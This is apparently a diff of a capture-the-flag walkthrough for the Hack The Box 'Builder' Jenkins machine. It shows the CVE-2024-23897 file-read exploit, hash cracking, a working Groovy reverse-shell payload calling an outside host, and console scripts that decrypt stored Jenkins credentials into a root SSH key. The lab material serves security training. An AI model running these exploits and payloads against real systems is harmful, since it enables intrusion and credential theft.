@@ -1,6 +1,6 @@
 ## Reconnaissance
 - Nmap scans :
-```
+	```bash
 nmap -sV -sC -vv -p- 10.10.11.10
 nmap -sU --top-ports=10 -vv 10.10.11.10
 
@@ -30,25 +30,25 @@ PORT     STATE         SERVICE      REASON
 67/udp   open|filtered dhcps        no-response
 161/udp  open|filtered snmp         no-response
 ```
-- TCP:
-- Linux OS
-- 8080 tcp port (Jetty 10.0.18?, Jenkins Dashboard)
-- UDP:
-- SNMP port open
+	- TCP:
+		- Linux OS
+		- 8080 tcp port (Jetty 10.0.18?, Jenkins Dashboard)
+	- UDP:
+		- SNMP port open
 - Website : access 10.10.11.10:8080
-- Jenkins Dashboard
-- REST API leads to /api/
-- Jenkins version 2.441
-- searchsploit reveals a vulnerability but we google to understand it as the python file does not explain.
-- CVE-2024-23897
-- People > userid : jennifer
-- On refreshing I also find userid "anonymous"
-- Credentials > System > Global Credentials > root with SSH private key
-- Sign-in page
+	- Jenkins Dashboard
+		- REST API leads to /api/
+		- Jenkins version 2.441
+			- searchsploit reveals a vulnerability but we google to understand it as the python file does not explain.
+				- CVE-2024-23897
+	- People > userid : jennifer
+		- On refreshing I also find userid "anonymous"
+	- Credentials > System > Global Credentials > root with SSH private key
+	- Sign-in page
 - Directory Enumeration
-- ffuf reveals nothing
-- gobuster:
-```bash
+	- ffuf reveals nothing
+	- gobuster:
+		```bash
 gobuster dir -u http://builder.htb:8080/ dns --wordlist /usr/share/wordlists/dirb/common.txt
 
 ---OUTPUT---
@@ -79,15 +79,15 @@ gobuster dir -u http://builder.htb:8080/ dns --wordlist /usr/share/wordlists/dir
 /timeline             (Status: 302) [Size: 0] [--> http://builder.htb:8080/timeline/]
 /widgets              (Status: 302) [Size: 0] [--> http://builder.htb:8080/widgets/]
 ```
-- robots.txt :
-```bash
+		- robots.txt :
+			```bash
 # we don't want robots to click "build" links
 User-agent: *
 Disallow: /
 ```
-- /api/
+		- /api/
 - dirsearch :
-```bash
+	```bash
 dirsearch -u http://builder.htb:8080
 
 ---OUTPUT---
@@ -116,28 +116,28 @@ dirsearch -u http://builder.htb:8080
 [19:25:28] 302 -    0B  - /search  ->  http://builder.htb:8080/search/      
 
 ```
-- /assets/
-- /cli/
-- trying some of those pages leads to some jenkins error so maybe accessible after logging in
+	- /assets/
+	- /cli/
+	- trying some of those pages leads to some jenkins error so maybe accessible after logging in
 - from searchsploit I tried the downloaded exploit:
-```bash
+	```bash
 python3 51993.py -u http://builder.htb:8080 -p /etc/passwd | grep "sh"
 
 ---OUTPUT---
 root:x:0:0:root:/root:/bin/bash
 jenkins:x:1000:1000::/var/jenkins_home:/bin/bash
 ```
-- It works and we get the user jenkins home directory, so we grab users.txt
-```bash
+	- It works and we get the user jenkins home directory, so we grab users.txt
+		```bash
 python3 51993.py -u http://builder.htb:8080 -p /var/jenkins_home/user.txt
 
 ---OUTPUT---
 7c4babe70d59c7023df217f486de8f48
 ```
 - We search online for finding users for jenkins web application. We find that it stores information in XML format.
-- https://jenkins-le-guide-complet.github.io/html/sec-hudson-home-directory-contents.html
-- says theres a user directory. 
-```bash
+	- https://jenkins-le-guide-complet.github.io/html/sec-hudson-home-directory-contents.html
+		- says theres a user directory. 
+			```bash
 python3 51993.py -u http://builder.htb:8080 -p /var/jenkins_home/users/users.xml
 
 ---OUTPUT---
@@ -152,16 +152,16 @@ python3 51993.py -u http://builder.htb:8080 -p /var/jenkins_home/users/users.xml
 <hudson.model.UserIdMapper>
     </entry>
 ```
-- We check the config.xml of jennifer_12108429903186576833
-```bash
+	- We check the config.xml of jennifer_12108429903186576833
+		```bash
 python3 51993.py -u http://builder.htb:8080 -p /var/jenkins_home/users/jennifer_12108429903186576833/config.xml
 
 ---OUTPUT---
 <passwordHash>#jbcrypt:$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a</passwordHash>
 ```
-- Hash : $2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a
-- We crack it with John The Ripper tool
-```bash
+		- Hash : $2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a
+			- We crack it with John The Ripper tool
+				```bash
 vi hash # Copy hash
 OR
 touch hash
@@ -175,34 +175,34 @@ princess         (?)
 ```
 - We login to web application with these credentials.
 - I found :
-- http://10.10.11.10:8080/manage/script
-- can execute groovy script where i searched online and found a script
-```bash
+	- http://10.10.11.10:8080/manage/script
+		- can execute groovy script where i searched online and found a script
+			```bash
 String host="10.10.14.25";
 int port=9999;
 String cmd="/bin/bash";
 Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
 ```
-- I ran this script with netcat listening and got a reverse shell.
+		- I ran this script with netcat listening and got a reverse shell.
 - I made a proper shell:
-```bash
+	```bash
 script /dev/null -c bash
 ```
 - In the home directory when we pass `ls -la` we find
-- secret.key
-- credentials.xml
-- This file reveals a private key of root but when copying it to try and ssh into as root, so it implies this could be an encrypted private key.
+	- secret.key
+	- credentials.xml
+		- This file reveals a private key of root but when copying it to try and ssh into as root, so it implies this could be an encrypted private key.
 - On searching online for ways to decrypt it i came across some:
-- AI code
-- https://www.reddit.com/r/jenkinsci/comments/16oqqak/ssh_keys_in_manage_credentials_or_global/
-- https://gist.github.com/hoto/d1c874480888f8711f12db33a20b6e4d
+	- AI code
+	- https://www.reddit.com/r/jenkinsci/comments/16oqqak/ssh_keys_in_manage_credentials_or_global/
+	- https://gist.github.com/hoto/d1c874480888f8711f12db33a20b6e4d
 - We pass this in the script region 
-- Manage Jenkins > Script Console
-- http://10.10.11.10:8080/manage/script
-- Manage Jenkins also shows plugins where we can check that the ssh plugin is installed for storing ssh credentials
+	- Manage Jenkins > Script Console
+		- http://10.10.11.10:8080/manage/script
+		- Manage Jenkins also shows plugins where we can check that the ssh plugin is installed for storing ssh credentials
 ------
 - private key command (AI):
-```bash
+	```bash
 import com.cloudbees.plugins.credentials.CredentialsProvider
 import com.cloudbees.plugins.credentials.domains.Domain
 import com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl
@@ -220,18 +220,18 @@ creds.each { c ->
 
 ```
 - The script is based on Jenkins' internal Groovy APIs, primarily from:
-- Jenkins Credentials Plugin API – It allows fetching stored credentials from Jenkins.
-- com.cloudbees.plugins.credentials.SystemCredentialsProvider provides access to stored credentials.
-- BasicSSHUserPrivateKey is the specific class for SSH private keys.
-- Jenkins Instance Methods
-- Jenkins.instance.getExtensionList() is commonly used to access system-wide configurations.
-- Decryption API (hudson.util.Secret)
-- Secret.decrypt() is Jenkins' built-in function for decrypting stored secrets (like passwords and keys).
-- Experience and Prior Research
-- Similar methods have been used in Jenkins privilege escalation, pentesting reports, and public research.
+	- Jenkins Credentials Plugin API – It allows fetching stored credentials from Jenkins.
+		- com.cloudbees.plugins.credentials.SystemCredentialsProvider provides access to stored credentials.
+		- BasicSSHUserPrivateKey is the specific class for SSH private keys.
+	- Jenkins Instance Methods
+		- Jenkins.instance.getExtensionList() is commonly used to access system-wide configurations.
+	- Decryption API (hudson.util.Secret)
+		- Secret.decrypt() is Jenkins' built-in function for decrypting stored secrets (like passwords and keys).
+	- Experience and Prior Research
+		- Similar methods have been used in Jenkins privilege escalation, pentesting reports, and public research.
 - Or from this link :
-- test
-```bash
+	- test
+		```bash
 def creds = com.cloudbees.plugins.credentials.CredentialsProvider.lookupCredentials(
 com.cloudbees.plugins.credentials.common.StandardUsernameCredentials.class,Jenkins.instance,null,null
 );
@@ -242,13 +242,13 @@ for (c in creds) {
 }
 ```
 - Or this command **Ideal as it shows what function is being used to decrypt the key which is hudson.util.Secret.decrypt**
-```bash
+	```bash
 hashed_pw='{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}'
 passwd = hudson.util.Secret.decrypt(hashed_pw)
 println(passwd)
 ```
-- Gives private key :
-```bash
+	- Gives private key :
+		```bash
 ID: 1
 Username: root
 Private Key: 
@@ -294,8 +294,9 @@ iGFOXbo3+1sSg1AAAADHJvb3RAYnVpbGRlcgECAwQFBg==
 Result: [com.cloudbees.jenkins.plugins.sshcredentials.impl.BasicSSHUserPrivateKey@31]
 ```
 - we ssh into machine as root user with this private key
-```bash
+	```bash
 vi id_rsa # copy the private key
 chmod 0600 id_rsa
 ssh -i id_rsa root@builder.htb
 ```
+- Ippsec executes a pipeline to grab the ssh key
